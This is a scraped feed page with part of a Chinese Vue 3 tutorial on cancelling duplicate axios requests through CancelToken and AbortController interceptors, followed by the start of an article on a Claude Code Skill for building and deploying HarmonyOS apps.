<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// utils/request.js</span>
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>;

<span class="hljs-comment">// 存储所有进行中请求的Map</span>
<span class="hljs-keyword">const</span> pendingRequestMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-comment">/**
 * 生成请求的唯一标识键
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">*</span>} config axios的请求配置对象
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">string</span>} 唯一键
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">generateReqKey</span>(<span class="hljs-params">config</span>) {
  <span class="hljs-keyword">const</span> { method, url, params, data } = config;
  <span class="hljs-comment">// 简单拼接，可根据业务复杂化（如对data排序）</span>
  <span class="hljs-keyword">return</span> [method, url, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(params), <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)].<span class="hljs-title function_">join</span>(<span class="hljs-string">'&amp;'</span>);
}

<span class="hljs-comment">/**
 * 添加请求到等待队列
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">*</span>} config axios的请求配置对象
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">addPendingRequest</span>(<span class="hljs-params">config</span>) {
  <span class="hljs-keyword">const</span> requestKey = <span class="hljs-title function_">generateReqKey</span>(config);
  <span class="hljs-comment">// 为这个请求创建一个取消令牌源</span>
  config.<span class="hljs-property">cancelToken</span> = config.<span class="hljs-property">cancelToken</span> || <span class="hljs-keyword">new</span> axios.<span class="hljs-title class_">CancelToken</span>(<span class="hljs-function">(<span class="hljs-params">cancel</span>) =&gt;</span> {
    <span class="hljs-comment">// 如果Map中还没有这个key，则添加进去</span>
    <span class="hljs-keyword">if</span> (!pendingRequestMap.<span class="hljs-title function_">has</span>(requestKey)) {
      pendingRequestMap.<span class="hljs-title function_">set</span>(requestKey, cancel);
    }
  });
}

<span class="hljs-comment">/**
 * 移除等待队列中的请求
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">*</span>} config axios的请求配置对象
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">removePendingRequest</span>(<span class="hljs-params">config</span>) {
  <span class="hljs-keyword">const</span> requestKey = <span class="hljs-title function_">generateReqKey</span>(config);
  <span class="hljs-keyword">if</span> (pendingRequestMap.<span class="hljs-title function_">has</span>(requestKey)) {
    <span class="hljs-comment">// 如果在Map中存在这个请求，说明它还未完成，将其取消并从Map中移除</span>
    <span class="hljs-keyword">const</span> cancel = pendingRequestMap.<span class="hljs-title function_">get</span>(requestKey);
    <span class="hljs-title function_">cancel</span>(requestKey); <span class="hljs-comment">// 取消请求，可以传递消息</span>
    pendingRequestMap.<span class="hljs-title function_">delete</span>(requestKey);
  }
}

<span class="hljs-comment">// 创建axios实例</span>
<span class="hljs-keyword">const</span> service = axios.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,
});

<span class="hljs-comment">// 请求拦截器：在请求发出前，检查并取消重复请求</span>
service.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">config</span>) =&gt;</span> {
    <span class="hljs-comment">// 检查并取消之前的相同请求</span>
    <span class="hljs-title function_">removePendingRequest</span>(config);
    <span class="hljs-comment">// 将当前请求添加到等待队列</span>
    <span class="hljs-title function_">addPendingRequest</span>(config);
    <span class="hljs-keyword">return</span> config;
  },
  <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);
  }
);

<span class="hljs-comment">// 响应拦截器：请求完成后（无论成功失败），将其从等待队列中移除</span>
service.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
    <span class="hljs-title function_">removePendingRequest</span>(response.<span class="hljs-property">config</span>);
    <span class="hljs-keyword">return</span> response;
  },
  <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
    <span class="hljs-comment">// 如果错误是因为取消请求造成的，我们选择忽略这个错误，不抛出到业务层</span>
    <span class="hljs-keyword">if</span> (axios.<span class="hljs-title function_">isCancel</span>(error)) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'已取消的重复请求:'</span>, error.<span class="hljs-property">message</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">() =&gt;</span> {}); <span class="hljs-comment">// 返回一个“永远pending”的Promise，中断Promise链</span>
    }
    <span class="hljs-comment">// 对于其他错误，移除请求并正常抛出</span>
    <span class="hljs-title function_">removePendingRequest</span>(error.<span class="hljs-property">config</span> || {});
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);
  }
);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> service;
</code></pre>
<p>然后，在Vue组件中，你可以直接使用这个封装好的 <code>service</code> 来发起请求。它会自动处理重复请求的取消。</p>
<pre><code class="hljs language-ini" lang="ini">&lt;script setup&gt;
import { ref } from 'vue'<span class="hljs-comment">;</span>
import request from '@/utils/request'<span class="hljs-comment">;</span>

const <span class="hljs-attr">searchResults</span> = ref([])<span class="hljs-comment">;</span>
const <span class="hljs-attr">loading</span> = ref(<span class="hljs-literal">false</span>)<span class="hljs-comment">;</span>

const <span class="hljs-attr">handleSearch</span> = async (keyword) =&gt; {
  <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
  try {
    const <span class="hljs-attr">response</span> = await request.get(<span class="hljs-string">'/api/search'</span>, {
      params: { keyword }
    })<span class="hljs-comment">;</span>
    <span class="hljs-attr">searchResults.value</span> = response.data<span class="hljs-comment">;</span>
  } catch (error) {
    // 这里不会捕获到因重复请求被取消而抛出的错误，因为我们在拦截器中已经处理了
    console.error('搜索失败:', error)<span class="hljs-comment">;</span>
  } finally {
    <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
  }
}<span class="hljs-comment">;</span>
&lt;/script&gt;
</code></pre>
<blockquote>
<p><strong>注意</strong>：<code>CancelToken</code> 方式在 <code>axios</code> 新版本中已被标记为弃用。对于新项目，建议直接使用下面介绍的更现代的 <code>AbortController</code> 方案。</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">方案二： AbortController</h2>
<p><code>AbortController</code> 是一个现代的Web API，它提供了一种更通用、更标准的方式来中止一个或多个Web请求。<code>fetch</code> API 和新的 <code>axios</code> 版本都原生支持它。使用 <code>AbortController</code> 是当前推荐的做法。</p>
<h3 data-id="heading-5">基本概念</h3>
<ul>
<li>• <code>AbortController</code>：控制器对象，用于触发中止信号。</li>
<li>• <code>AbortSignal</code>：信号对象，关联到具体的请求上。控制器可以通过它来通知请求“需要中止”。</li>
</ul>
<h3 data-id="heading-6">基本使用示例</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 创建一个 AbortController 实例</span>
<span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();
<span class="hljs-keyword">const</span> signal = controller.<span class="hljs-property">signal</span>; <span class="hljs-comment">// 获取它的 signal</span>

<span class="hljs-comment">// 2. 发起 fetch 请求，并将 signal 关联上去</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/some-data'</span>, { signal })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
    <span class="hljs-comment">// 如果错误是因为请求被中止</span>
    <span class="hljs-keyword">if</span> (err.<span class="hljs-property">name</span> === <span class="hljs-string">'AbortError'</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Fetch 请求被中止'</span>);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'其他错误:'</span>, err);
    }
  });

<span class="hljs-comment">// 3. 在需要的时候中止请求</span>
controller.<span class="hljs-title function_">abort</span>(); <span class="hljs-comment">// 这会触发 signal 的中止事件，从而取消请求</span>
</code></pre>
<h3 data-id="heading-7">在 Axios 中使用 AbortController</h3>
<p>从 <code>axios</code> v0.22.0 开始，你可以使用 <code>signal</code> 属性来配置 <code>AbortSignal</code>。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>;

<span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();

axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/user/123'</span>, {
  <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> <span class="hljs-comment">// 将 signal 传递给请求配置</span>
}).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response.<span class="hljs-property">data</span>);
}).<span class="hljs-keyword">catch</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) {
  <span class="hljs-comment">// 判断错误是否是因为请求被取消</span>
  <span class="hljs-keyword">if</span> (axios.<span class="hljs-title function_">isCancel</span>(error)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'请求被取消:'</span>, error.<span class="hljs-property">message</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 处理其他错误</span>
  }
});

<span class="hljs-comment">// 取消请求</span>
controller.<span class="hljs-title function_">abort</span>();
</code></pre>
<h3 data-id="heading-8">封装基于 AbortController 的重复请求取消</h3>
<p>我们可以用类似的思路，用 <code>AbortController</code> 重构之前的工具函数。主要变化是将存储的 <code>cancel</code> 函数替换为 <code>AbortController</code> 实例。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// utils/request-abort.js</span>
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>;

<span class="hljs-keyword">const</span> pendingRequestMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-keyword">function</span> <span class="hljs-title function_">generateReqKey</span>(<span class="hljs-params">config</span>) {
  <span class="hljs-keyword">const</span> { method, url, params, data } = config;
  <span class="hljs-keyword">return</span> [method, url, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(params), <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)].<span class="hljs-title function_">join</span>(<span class="hljs-string">'&amp;'</span>);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">addPendingRequest</span>(<span class="hljs-params">config</span>) {
  <span class="hljs-keyword">const</span> requestKey = <span class="hljs-title function_">generateReqKey</span>(config);
  <span class="hljs-comment">// 如果已有相同请求在进行，则中止它</span>
  <span class="hljs-keyword">if</span> (pendingRequestMap.<span class="hljs-title function_">has</span>(requestKey)) {
    <span class="hljs-keyword">const</span> oldController = pendingRequestMap.<span class="hljs-title function_">get</span>(requestKey);
    oldController.<span class="hljs-title function_">abort</span>(); <span class="hljs-comment">// 中止旧的请求</span>
    pendingRequestMap.<span class="hljs-title function_">delete</span>(requestKey);
  }
  <span class="hljs-comment">// 为当前请求创建新的控制器并存储</span>
  <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();
  config.<span class="hljs-property">signal</span> = controller.<span class="hljs-property">signal</span>; <span class="hljs-comment">// 关键：将 signal 赋给请求配置</span>
  pendingRequestMap.<span class="hljs-title function_">set</span>(requestKey, controller);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">removePendingRequest</span>(<span class="hljs-params">config</span>) {
  <span class="hljs-keyword">const</span> requestKey = <span class="hljs-title function_">generateReqKey</span>(config);
  <span class="hljs-keyword">if</span> (pendingRequestMap.<span class="hljs-title function_">has</span>(requestKey)) {
    <span class="hljs-comment">// 请求完成，直接从Map中移除即可，不需要手动abort</span>
    pendingRequestMap.<span class="hljs-title function_">delete</span>(requestKey);
  }
}

<span class="hljs-keyword">const</span> service = axios.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,
});

service.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">config</span>) =&gt;</span> {
    <span class="hljs-title function_">removePendingRequest</span>(config); <span class="hljs-comment">// 先移除可能存在的旧记录（清理作用）</span>
    <span class="hljs-title function_">addPendingRequest</span>(config); <span class="hljs-comment">// 添加新请求</span>
    <span class="hljs-keyword">return</span> config;
  },
  <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);
  }
);

service.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
    <span class="hljs-title function_">removePendingRequest</span>(response.<span class="hljs-property">config</span>);
    <span class="hljs-keyword">return</span> response;
  },
  <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
    <span class="hljs-comment">// 判断错误是否由取消请求导致</span>
    <span class="hljs-keyword">if</span> (axios.<span class="hljs-title function_">isCancel</span>(error)) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'已取消的重复请求:'</span>, error.<span class="hljs-property">message</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">() =&gt;</span> {}); <span class="hljs-comment">// 中断Promise链</span>
    }
    <span class="hljs-title function_">removePendingRequest</span>(error.<span class="hljs-property">config</span> || {});
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);
  }
);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> service;
</code></pre>
<p>这个版本的逻辑更清晰：<strong>在添加新请求时，直接中止旧的相同请求</strong>。响应拦截器里只需要做清理工作。</p>
<hr/>
<h2 data-id="heading-9">进阶与优化</h2>
<p>上面的方案解决了核心问题，但在实际项目中，我们可能还需要考虑更多细节。</p>
<h3 data-id="heading-10">1. 白名单控制</h3>
<p>有些请求我们可能不希望被自动取消。例如，一个轮询定时请求，或者多个并行的不同数据请求。我们可以通过给请求配置添加一个自定义标记（如 <code>allowRepeat: true</code>）来实现白名单。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 在拦截器中</span>
service.interceptors.request.<span class="hljs-built_in">use</span>(
  (config) =&gt; {
    <span class="hljs-comment">// 如果配置了允许重复，则跳过取消逻辑</span>
    <span class="hljs-keyword">if</span> (config.allowRepeat) {
      <span class="hljs-keyword">return</span> config;
    }
    <span class="hljs-built_in">removePendingRequest</span>(config);
    <span class="hljs-built_in">addPendingRequest</span>(config);
    <span class="hljs-keyword">return</span> config;
  }
);

<span class="hljs-comment">// 在组件中使用</span>
request.<span class="hljs-built_in">get</span>(<span class="hljs-string">'/api/polling'</span>, { allowRepeat: <span class="hljs-literal">true</span> });
</code></pre>
<h3 data-id="heading-11">2. 与 Vue Router 导航守卫结合</h3>
<p>当用户切换页面时，我们通常希望取消所有未完成的请求，以免它们在后台继续运行并可能更新一个已经销毁的组件状态。这可以在Vue Router的全局前置守卫中实现。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// router/index.js</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span>;
<span class="hljs-keyword">import</span> { pendingRequestMap } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/request-abort'</span>; <span class="hljs-comment">// 需要将map导出</span>

router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
  <span class="hljs-comment">// 遍历并中止所有进行中的请求</span>
  pendingRequestMap.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">controller, key</span>) =&gt;</span> {
    controller.<span class="hljs-title function_">abort</span>(<span class="hljs-string">`路由跳转至 <span class="hljs-subst">${to.path}</span>`</span>);
  });
  <span class="hljs-comment">// 清空Map</span>
  pendingRequestMap.<span class="hljs-title function_">clear</span>();
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<h3 data-id="heading-12">3. 使用 Composition API 封装</h3>
<p>在Vue3中，我们可以利用组合式API，将取消逻辑封装成一个更优雅、可复用的 <code>useRequest</code> Hook。</p>
<pre><code class="hljs language-ini" lang="ini">// composables/useRequest.js
import { ref, onUnmounted } from 'vue'<span class="hljs-comment">;</span>
import request from '@/utils/request-abort'<span class="hljs-comment">;</span>

export function useRequest() {
  const <span class="hljs-attr">data</span> = ref(null)<span class="hljs-comment">;</span>
  const <span class="hljs-attr">error</span> = ref(null)<span class="hljs-comment">;</span>
  const <span class="hljs-attr">loading</span> = ref(<span class="hljs-literal">false</span>)<span class="hljs-comment">;</span>
  let <span class="hljs-attr">abortController</span> = null<span class="hljs-comment">;</span>

  const <span class="hljs-attr">execute</span> = async (config) =&gt; {
    <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">error.value</span> = null<span class="hljs-comment">;</span>
    // 为这次执行创建一个独立的控制器（可选，如果全局已管理则可省略）
    <span class="hljs-attr">abortController</span> = new AbortController()<span class="hljs-comment">;</span>
    try {
      const <span class="hljs-attr">response</span> = await request({
        ...config,
        signal: abortController.signal
      })<span class="hljs-comment">;</span>
      <span class="hljs-attr">data.value</span> = response.data<span class="hljs-comment">;</span>
      return response<span class="hljs-comment">;</span>
    } catch (err) {
      if (!axios.isCancel(err)) {
        <span class="hljs-attr">error.value</span> = err<span class="hljs-comment">;</span>
      }
      throw err<span class="hljs-comment">;</span>
    } finally {
      <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
    }
  }<span class="hljs-comment">;</span>

  // 组件卸载时，取消由这个Hook发起的请求
  onUnmounted(() =&gt; {
    if (abortController) {
      abortController.abort()<span class="hljs-comment">;</span>
    }
  })<span class="hljs-comment">;</span>

  // 提供一个手动取消的方法
  const <span class="hljs-attr">cancel</span> = () =&gt; {
    if (abortController) {
      abortController.abort()<span class="hljs-comment">;</span>
    }
  }<span class="hljs-comment">;</span>

  return {
    data,
    error,
    loading,
    execute,
    cancel
  }<span class="hljs-comment">;</span>
}
</code></pre>
<p>在组件中使用：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useRequest } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/composables/useRequest'</span>;

<span class="hljs-keyword">const</span> { data, loading, execute } = <span class="hljs-title function_">useRequest</span>();

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">execute</span>({
    <span class="hljs-attr">method</span>: <span class="hljs-string">'post'</span>,
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/submit'</span>,
    <span class="hljs-attr">data</span>: { <span class="hljs-comment">/* ... */</span> }
  });
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<hr/>
<p>取消重复请求是一个看似简单，但能显著提升应用健壮性的优化点。在Vue3项目中，结合 <code>axios</code> 和 <code>AbortController</code>，我们可以用清晰的代码实现这一功能。希望本文介绍的方法和思路，能帮助你更好地处理项目中的网络请求问题。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[让 AI 帮你编译部署鸿蒙应用：harmonyos-build-deploy Skill]]></title>    <link>https://juejin.cn/post/7603183929251954740</link>    <guid>https://juejin.cn/post/7603183929251954740</guid>    <pubDate>2026-02-05T13:10:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603183929251954740" data-draft-id="7603183929251905588" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="让 AI 帮你编译部署鸿蒙应用：harmonyos-build-deploy Skill "/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-05T13:10:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="城中的雾"/> <meta itemprop="url" content="https://juejin.cn/user/77390767983908"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            让 AI 帮你编译部署鸿蒙应用：harmonyos-build-deploy Skill 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/77390767983908/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    城中的雾
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T13:10:02.000Z" title="Thu Feb 05 2026 13:10:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>这不是一篇教你敲命令的文章。这是一篇关于如何让 AI 成为你的鸿蒙开发助手，帮你完成从编译到部署全流程的实践分享。</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb2953a95cac489c9fff8e7aeaf6a8b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Z-O5Lit55qE6Zu-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770901805&amp;x-signature=PVAKo1ThDDdrpu3R0C0gUAnfsXw%3D" alt="image-20260205203044086.png" loading="lazy"/></p>
<h2 data-id="heading-0">为什么要做这个 Skill？</h2>
<h3 data-id="heading-1">不是给开发者用的，是给 AI 用的</h3>
<p>传统的 CLI 工具设计理念是：<strong>开发者学习命令 → 开发者执行命令</strong>。</p>
<p>但在 AI Coding 时代，我们有了新的可能：<strong>开发者描述需求 → AI 理解并执行</strong>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2def81b6d21a47309bfe50ed4b73faff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Z-O5Lit55qE6Zu-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770901805&amp;x-signature=Czj5R1LmuA9mTds6xOesKRxtKBs%3D" alt="01.001.png" loading="lazy"/></p>
<p><strong>harmonyos-build-deploy</strong> 的设计初心就是：</p>
<blockquote>
<p>让 Claude 能够理解鸿蒙项目，自动完成编译、签名、部署、调试的全流程。开发者只需要用自然语言描述需求。</p>
</blockquote>
<h2 data-id="heading-2">什么是 Claude Code Skill？</h2>
